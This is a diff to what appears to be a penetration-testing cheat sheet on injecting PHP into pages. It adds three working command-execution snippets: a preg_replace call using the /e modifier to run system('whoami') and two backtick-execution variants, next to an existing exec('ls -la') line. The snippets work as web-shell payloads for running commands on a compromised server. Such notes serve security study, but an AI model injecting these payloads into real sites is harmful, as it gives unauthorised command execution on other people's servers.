@@ -25,6 +25,16 @@ This code can be injected into pages that use php.
 # Instead to this if you can. It will return the output as an array, and then print it all.
 <?php exec("ls -la",$array); print_r($array); ?>
 
+# preg_replace(). This is a cool trick
+<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
+
+# Using backticks
+<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>
+
+# Using backticks
+<?php echo `whoami`; ?>
+
+
 ```
 
 You can then call then execute the commands like this:
